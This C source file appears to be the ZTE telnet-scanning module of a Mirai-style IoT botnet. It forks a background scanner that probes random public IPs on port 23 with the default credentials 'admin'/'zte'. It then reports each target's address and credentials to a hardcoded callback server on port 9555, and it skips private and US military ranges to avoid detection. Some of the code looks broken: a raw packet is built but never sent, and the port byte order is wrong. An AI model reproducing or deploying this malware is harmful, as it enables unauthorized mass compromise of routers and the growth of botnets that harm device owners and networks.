#ifdef SELFREP
#define _GNU_SOURCE
#ifdef DEBUG
    #include <stdio.h>
#endif
#include <unistd.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/select.h>
#include <sys/types.h>
#include <time.h>
#include <fcntl.h>
#include <signal.h>
#include <errno.h>
#include <string.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include "includes.h"
#include "zte_scanner.h"
#include "table.h"
#include "rand.h"
#include "util.h"
#include "checksum.h"
int zte_scanner_pid = 0, zte_rsck = 0, zte_rsck_out = 0, zte_auth_table_len = 0;
char zte_scanner_rawpkt[sizeof(struct iphdr) + sizeof(struct tcphdr)] = {0};
struct zte_scanner_auth *zte_auth_table = NULL;
struct zte_scanner_connection *conn_table;
uint16_t zte_auth_table_max_weight = 0;
uint32_t zte_fake_time = 0;
int zte_ranges[] = {189,187,201,185,186,188,190,191,192,193,194,195,196,197,198,199,202,203,204,205,206,207,208,209,210,211,212,213,214,215,216,217,218,219,220};
static void zte_report(ipv4_t addr, uint16_t port, const char *user, const char *pass)
{
    int fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd < 0) return;
    struct sockaddr_in cb;
    cb.sin_family = AF_INET;
    cb.sin_addr.s_addr = SCANIP;
    cb.sin_port = htons(9555);
    if (connect(fd, (struct sockaddr *)&cb, sizeof(cb)) == -1) {
        close(fd);
        return;
    }
    uint8_t zero = 0;
    send(fd, &zero, sizeof(uint8_t), MSG_NOSIGNAL);
    send(fd, &addr, sizeof(ipv4_t), MSG_NOSIGNAL);
    send(fd, &port, sizeof(uint16_t), MSG_NOSIGNAL);
    uint8_t ulen = (uint8_t)strlen(user);
    uint8_t plen = (uint8_t)strlen(pass);
    if (ulen == 0) ulen = 1; if (plen == 0) plen = 1;
    send(fd, &ulen, sizeof(uint8_t), MSG_NOSIGNAL);
    send(fd, user, ulen, MSG_NOSIGNAL);
    send(fd, &plen, sizeof(uint8_t), MSG_NOSIGNAL);
    send(fd, pass, plen, MSG_NOSIGNAL);
    close(fd);
}
int zte_recv_strip_null(int sock, void *buf, int len, int flags)
{
    int ret = recv(sock, buf, len, flags);
    if(ret > 0)
    {
        int i = 0;
        for(i = 0; i < ret; i++)
        {
            if(((char *)buf)[i] == 0x00)
            {
                ((char *)buf)[i] = 'A';
            }
        }
    }
    return ret;
}
void zte_scanner(void)
{
    int i = 0;
    uint16_t source_port;
    struct iphdr *iph;
    struct tcphdr *tcph;
    zte_scanner_pid = fork();
    if(zte_scanner_pid > 0 || zte_scanner_pid == -1)
        return;
    LOCAL_ADDR = util_local_addr();
    rand_init();
    zte_fake_time = time(NULL);
    conn_table = calloc(ZTE_SCANNER_MAX_CONNS, sizeof(struct zte_scanner_connection));
    for(i = 0; i < ZTE_SCANNER_MAX_CONNS; i++)
    {
        conn_table[i].state = ZTE_SC_CLOSED;
        conn_table[i].fd = -1;
        conn_table[i].credential_index = 0;
    }
    if((zte_rsck = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
    {
        #ifdef DEBUG
            printf("[zte_scanner] failed to initialize raw socket, cannot scan\n");
        #endif
        exit(0);
    }
    fcntl(zte_rsck, F_SETFL, O_NONBLOCK | fcntl(zte_rsck, F_GETFL, 0));
    i = 1;
    if(setsockopt(zte_rsck, IPPROTO_IP, IP_HDRINCL, &i, sizeof(i)) != 0)
    {
        #ifdef DEBUG
            printf("[zte_scanner] failed to set IP_HDRINCL, cannot scan\n");
        #endif
        close(zte_rsck);
        exit(0);
    }
    do
    {
        source_port = rand_next() & 0xffff;
        zte_fake_time = time(NULL);
        zte_scanner_rawpkt[0] = 0x45;
        zte_scanner_rawpkt[1] = 0x00;
        zte_scanner_rawpkt[2] = 0x00;
        zte_scanner_rawpkt[3] = 0x3c;
        zte_scanner_rawpkt[4] = 0x00;
        zte_scanner_rawpkt[5] = 0x00;
        zte_scanner_rawpkt[6] = 0x00;
        zte_scanner_rawpkt[7] = 0x00;
        zte_scanner_rawpkt[8] = 0xff;
        zte_scanner_rawpkt[9] = 0x06;
        zte_scanner_rawpkt[10] = 0x00;
        zte_scanner_rawpkt[11] = 0x00;
        zte_scanner_rawpkt[12] = LOCAL_ADDR & 0xff;
        zte_scanner_rawpkt[13] = (LOCAL_ADDR >> 8) & 0xff;
        zte_scanner_rawpkt[14] = (LOCAL_ADDR >> 16) & 0xff;
        zte_scanner_rawpkt[15] = (LOCAL_ADDR >> 24) & 0xff;
        iph = (struct iphdr *)zte_scanner_rawpkt;
        tcph = (struct tcphdr *)&zte_scanner_rawpkt[sizeof(struct iphdr)];
        zte_setup_connection(&conn_table[i]);
        i = (i + 1) % ZTE_SCANNER_MAX_CONNS;
    }
    while(1);
    close(zte_rsck);
}
void zte_kill(void)
{
    if(zte_scanner_pid > 0)
        kill(zte_scanner_pid, 9);
}
static void zte_setup_connection(struct zte_scanner_connection *conn)
{
    struct sockaddr_in addr;
    if(conn->fd != -1)
        close(conn->fd);
    if((conn->fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
    {
        #ifdef DEBUG
            printf("[zte_scanner] failed to call socket()\n");
        #endif
        return;
    }
    conn->dst_addr = get_random_zte_ip();
    conn->dst_port = 23; 
    conn->state = ZTE_SC_CONNECTING;
    conn->last_recv = zte_fake_time;
    conn->rdbuf_pos = 0;
    fcntl(conn->fd, F_SETFL, O_NONBLOCK | fcntl(conn->fd, F_GETFL, 0));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = conn->dst_addr;
    addr.sin_port = conn->dst_port;
    connect(conn->fd, (struct sockaddr *)&addr, sizeof(struct sockaddr_in));
    util_strcpy(conn->payload_buf, "admin\nzte\n"); 
    zte_report(conn->dst_addr, htons(conn->dst_port), "admin", "zte");
}
static ipv4_t get_random_zte_ip(void)
{
    uint32_t tmp;
    uint8_t o1, o2, o3, o4;
    do
    {
        tmp = rand_next();
        int range = rand() % (sizeof(zte_ranges)/sizeof(int));
        o1 = zte_ranges[range];
        o2 = tmp & 0xff;
        o3 = (tmp >> 8) & 0xff;
        o4 = (tmp >> 16) & 0xff;
    }
    while(o1 == 127 ||                             
          (o1 == 0) ||                              
          (o1 == 3) ||                              
          (o1 == 15 || o1 == 16) ||                 
          (o1 == 56) ||                             
          (o1 == 10) ||                             
          (o1 == 192 && o2 == 168) ||               
          (o1 == 172 && o2 >= 16 && o2 < 32) ||     
          (o1 == 100 && o2 >= 64 && o2 < 127) ||    
          (o1 == 169 && o2 > 254) ||                
          (o1 == 198 && o2 >= 18 && o2 < 20) ||     
          (o1 >= 224) ||                            
          (o1 == 6 || o1 == 7 || o1 == 11 || o1 == 21 || o1 == 22 || o1 == 26 || o1 == 28 || o1 == 29 || o1 == 30 || o1 == 33 || o1 == 55 || o1 == 214 || o1 == 215) 
    );
    return INET_ADDR(o1,o2,o3,o4);
}
#endif
